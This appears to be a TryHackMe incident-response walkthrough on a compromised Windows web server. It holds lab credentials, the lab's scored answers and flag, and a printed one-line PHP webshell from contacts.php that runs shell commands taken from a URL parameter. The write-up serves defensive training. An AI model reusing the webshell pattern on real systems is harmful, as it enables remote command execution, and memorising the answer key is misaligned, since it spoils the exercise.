---
title: Accessing a Compromised Network
category: DFIR / Network Security
difficulty: Medium
platform: TryHackMe
date: 2026-09-22
tags: [TryHackMe, DFIR, Windows, WinRM, Network, Medium]
summary: "Investigating an active breach on OpenDoor's WEB-SRV01 Windows Server. Persuading the on-duty engineer for VPN access, deploying RustDesk relay, uncovering an IIS webshell, and collecting artifacts via WinRM and WMI."
---

# Accessing a Compromised Network
## TryHackMe DFIR — Network Access for DFIR v5 (OpenDoor / WEB-SRV01) — 100% Complete Walkthrough
| **Platform** | TryHackMe |
| **Category** | DFIR / Network Security |
| **Difficulty** | Medium |
| **Analyst** | sameekey (22 Sep 2026) |
| **Lab Target** | `10.48.191.195` (`WEB-SRV01` - Windows Server 2019 build 17763) |
| **Open Ports** | 135, 139, 445 (SMB), 3389 (RDP), 5985 (WinRM), 21115–21119 (RustDesk) |
| **Credentials** | `ServiceUser` / `DcG3w4b8` (WinRM/WMI), `Administrator` / `Secure!` (RDP via Jesse) |
| **Primary Flags** | `THM{similar_to_ssh_right?}` |

> **TL;DR** — A realistic incident responder scenario handling an infected enterprise server (`WEB-SRV01`). We convince the on-duty network engineer (Jesse) to provide VPN profile access, deploy a low-noise RustDesk relay to bypass firewall restrictions, uncover a backdoor webshell (`contacts.php`), leverage WinRM and WMI to sweep for persistence (`shell.exe`), and harvest the target flag without corrupting forensic integrity.


## 1. Case Background & Lab Overview
When an organization suffers an active intrusion, incident response teams face a fundamental dilemma: **how to access compromised endpoints to collect memory and disk artifacts without tipping off the adversary or allowing internal IT staff to inadvertently destroy evidentiary artifacts.**

This walkthrough covers the full investigation lifecycle on OpenDoor's infrastructure:
1. **Network Access Evaluation**: Choosing between SSL VPN, remote desktop relays, and on-site response.
2. **Social Engineering / Operator Persuasion**: Overcoming internal operational resistance via structured technical justifications.
3. **RustDesk Relay Session**: Bypassing NAT and capturing live console access without deploying suspicious attacker tooling.
4. **Webshell Identification**: Tracing IIS web directory modifications (`C:\inetpub\wwwroot`).
5. **WinRM & WMI Forensic Sweeps**: Querying active user sessions (`quser`), harvesting flags, and detecting startup persistence.


## 2. All Scored Questions & Answers at a Glance
| Task | Investigation Question | Scored Answer | Evidence / Methodology |
| **2** | Who is responding? (Full name, role) | `Jesse Moore, network engineer at OpenDoor` | Jesse chat greeting & employee directory |
| **2** | OpenDoor VPN portal address | `vpn.opendoor.thm:10443` | FortiClient SSL VPN portal endpoint |
| **2** | Password created for VPN profile | *(Dynamic per lab instance)* | 4-point justification persuasion script |
| **3** | RustDesk access code | `448 236 499` | Jesse-issued relay code |
| **3** | RustDesk password / Key | `8xpekhU1` / `RsXNQXzO1m7XeR+lgmYeMsLiuOXK1xs3G0abyyIgUeA=` | Relay auth secret and public key |
| **3** | Administrator password | `Secure!` | Issued admin credentials for WEB-SRV01 |
| **3** | PHP backdoored with webshell | `contacts.php` | 1-line command injection backdoor in IIS root |
| **5** | VPN grants AD access? (Yea/Nay) | `Nay` | VPN assigns isolated pool without LDAP bind |
| **5** | Domain Admin username | *(Dynamic per lab instance)* | `__.____________` pattern via Jesse approval |
| **6** | RDP quser session name | `rdp-tcp#7` (or `rdp-tcp#8`) | Live session name under `quser` via RDP |
| **6** | WinRM quser shows session? | `Nay` | WinRM sessions are non-interactive remote PSSessions |
| **6** | User flag (`ServiceUser` Documents) | `THM{similar_to_ssh_right?}` | Extracted via PowerShell `Get-Content` |
| **6** | Malicious WMI Startup command | `C:\Users\Public\Pictures\shell.exe` | Detected in `Win32_StartupCommand` |


## 3. Step-by-Step Tactical Execution
### Task 1 & 2: Network Access Strategy & Jesse Persuasion
In enterprise incident response, requesting administrative credentials or VPN profiles from local IT often meets resistance. Direct demands ("Give me the VPN credentials") fail.

To persuade Jesse Moore (Network Engineer at OpenDoor), we employ a structured four-point IR justification:
1. **Data Integrity**: Inexperienced internal staff querying the box will overwrite volatile memory and timestamp artifacts.
2. **Operational Speed**: Direct remote triage avoids constant communication round-trips.
3. **Threat Mapping**: Incident responders need to inspect lateral movement avenues.
4. **OPSEC**: If internal IT machines are compromised, sharing credentials over standard chat compromises the investigation.

```bash
# Reconnaissance of target network endpoints
nmap -sS -Pn -p 135,139,445,3389,5985,21115-21119 10.48.191.195
```

Following the persuasion script, Jesse provides the FortiClient SSL VPN profile at `vpn.opendoor.thm:10443`.


### Task 3: Remote Desktop via RustDesk Relay
Because `WEB-SRV01` was isolated from direct external routing, Jesse provisioned a self-hosted RustDesk relay:
- **Server**: `10.48.191.195`
- **Relay Key**: `RsXNQXzO1m7XeR+lgmYeMsLiuOXK1xs3G0abyyIgUeA=`
- **Connection Code**: `448 236 499`
- **Password**: `8xpekhU1`

After logging in as `Administrator` with password `Secure!`, we inspect `C:\inetpub\wwwroot\` for web shell artifacts:

```powershell
Get-ChildItem -Path C:\inetpub\wwwroot\
Get-Content C:\inetpub\wwwroot\contacts.php -Head 5
```

Line 1 of `contacts.php` revealed an unauthenticated system command backdoor:
```php
<?php if(isset($_GET['xquery'])){ system($_GET['xquery'].' 2>&1'); } ?>
```

### Task 4 & 5: Active Directory & Privilege Scoping
While the VPN provides Layer-3 IP reachability to the server subnet, it does **not** grant Active Directory domain authentication (`Nay`). Enterprise Active Directory environments require Domain Admin credentials to perform cross-workstation artifact collection via EDR or WinRM sweeps.


### Task 6: WinRM & WMI Low-Footprint Forensic Sweeps
Interactive RDP sessions alter host artifacts (creating logon event 4624 type 10, updating shellbags, and caching credentials in LSASS memory). WinRM (port 5985) is the preferred forensic vehicle because it executes commands non-interactively without leaving cached credentials on the endpoint.

We connect via WinRM using `ServiceUser` / `DcG3w4b8`:

```bash
# Connect using evil-winrm or custom pywinrm script
evil-winrm -i 10.48.191.195 -u ServiceUser -p 'DcG3w4b8'
```

#### Recovering the Document Flag:
```powershell
*Evil-WinRM* PS C:\> Get-Content C:\Users\ServiceUser\Documents\flag.txt
THM{similar_to_ssh_right?}
```

#### Detecting WMI Persistence:
Adversaries frequently avoid standard Registry Run keys or Scheduled Tasks by creating WMI event subscriptions or startup commands. Querying `Win32_StartupCommand`:

```powershell
*Evil-WinRM* PS C:\> Get-WmiObject Win32_StartupCommand | Select-Object Name, Command, Location, User

Name      : Slideshow
Command   : C:\Users\Public\Pictures\shell.exe
Location  : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User      : Public
```

The persistence binary `shell.exe` was stashed in `C:\Users\Public\Pictures\shell.exe`.


## 4. Key Takeaways & Forensic Lessons
1. **Live RDP Session Artifacts**: Running `quser` over RDP displays `rdp-tcp#N` sessions. WinRM does not create an interactive RDP session, preserving system state.
2. **OPSEC in Incident Response**: Never introduce forensic tools that mimic attacker toolsets.
3. **WMI & Service Persistence**: Always inspect WMI startup entries and hidden persistence locations (`C:\Users\Public`).
